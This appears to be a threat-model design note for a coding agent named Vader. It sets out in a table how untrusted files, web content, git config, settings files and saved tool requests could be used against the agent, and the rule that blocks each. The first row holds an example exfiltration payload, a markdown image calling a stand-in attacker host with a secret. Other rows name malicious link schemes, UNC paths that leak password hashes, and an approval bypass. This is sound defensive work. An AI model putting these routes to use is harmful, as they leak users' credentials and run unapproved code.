# Untrusted input: where text, files and folders can reach something dangerous, and what stops it

A coding agent reads things its user did not write: files in a cloned project, web pages, tool output, a chat export from a colleague, a folder that
arrived as an archive. Each of those can try to make Vader do something. These are the places that were found by looking for the unexpected route (not
only the obvious ones: the shell and the file tools, which the Policy Engine covers - see `policy.md`), and the rule that closes each.
Every rule has a regression test; the test file is named in brackets.

| Where | What could happen | Rule |
|---|---|---|
| Markdown in an answer or tool result: `![x](https://attacker/?d=SECRET)` | The chat would fetch the image at once, sending whatever the address holds, with no click | Only images that carry their own bytes (`data:image/png|jpeg|gif|webp;base64`) are drawn; a web image is shown as a link. [`settingsPortabilityE2E`, real-app scenario in `robustness`] |
| Markdown links: `[x](file:///...calc.exe)`, `smb://host/share`, `ms-msdt:`, `search-ms:` | One click hands the address to the operating system | Only `http`, `https` and `mailto` links are clickable; the rest is plain text. [same] |
| File tools given `\\host\share\x`, `//host/share/x` or `file://host/share/x` | On Windows the computer logs in to that host and sends the user's password hash; a read needs no approval | Network-share paths are refused with an explanation; `file://localhost/...` is normalised to a local path. [`tolerance` scenario] |
| Relative paths (`src/app.js`, `.`) from the model | Used to resolve to the root of the disk: `ls_dir .` listed `/`, a created file landed outside the project, and the policy looked at the wrong path | Resolved against the open folder (`~` against the home folder); with no folder open the model is told to use a full path. [`tolerance`, `noWorkspace`] |
| A folder whose `.git/config` names programs (`core.fsmonitor`, `diff.external`, hooks, `gpg.program`) | The first plain `git diff` Vader ran (commit message, verification evidence, worktree) started that program | Every git call Vader makes by itself uses `electron-main/safeGit.ts`: no program from the repository config, hooks off, no signing, no external diff. [`gitSafetyE2E`, with a control that shows plain git does run them] |
| "Export Settings" | The file held every API key and custom header, and is made to be shared | Keys and headers are written empty. [`settingsPortabilityE2E`] |
| "Import Settings" from a file someone else made | A file could point a provider at another server while the key already on the computer stayed attached | A key already on the computer is kept only when the provider's endpoint is unchanged. [same] |
| A tool request saved to disk (or in an imported chat export) waiting for approval | After a restart it ran as "already checked", so a crafted request skipped the Policy Engine's hard deny | Parameters are validated again from their raw text and the hard rules (policy deny, read-only modes, agent scope) run again before it executes. (Covered by the existing approval scenarios for the shared check; the restart path itself needs the native modules and is only type-checked locally.) |
| Reading `/dev/zero` or a named pipe | The main process spun at 100% CPU for minutes | Non-regular files are refused. [`robustness` scenario] |

What is deliberately **not** blocked: `.vaderrules` in a project is read as instructions (like `.cursorrules`); anything it makes the agent want to do still
goes through the same approvals and the hard policy. MCP servers are only started from `~/.vader-editor/mcp.json`, never from a project folder.
